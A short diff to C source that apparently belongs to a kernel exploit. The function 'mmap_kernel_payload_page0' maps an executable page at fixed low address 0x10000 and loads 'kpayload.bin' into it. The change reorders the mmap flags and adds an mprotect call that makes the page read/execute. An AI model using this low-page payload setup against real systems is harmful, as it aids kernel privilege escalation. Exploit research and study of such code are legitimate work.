@@ -87,7 +87,7 @@ void mmap_kernel_payload_page0() {
 	void* addr = (void *) 0x10000;
 	size_t length = 0x1000;
 
-	mmap_addr = mmap(addr, length, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);	
+	mmap_addr = mmap(addr, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANON, -1, 0);	
 	printf("mmap ret addr : 0x%X\n", (unsigned int) mmap_addr);
 
 	if (mmap_addr != (unsigned int*) addr) {
@@ -96,6 +96,14 @@ void mmap_kernel_payload_page0() {
 	}
 
 	readfile("kpayload.bin", mmap_addr, 0);
+
+	int ret = mprotect(addr, length, PROT_READ|PROT_EXEC);
+	printf("mprotect ret code : 0x%X\n", ret);
+
+	if (ret!=0) {
+		printf("mprotect failed.\n");
+		exit(1);
+	}
 }
 
 int main(int argc, char* argv[]) {
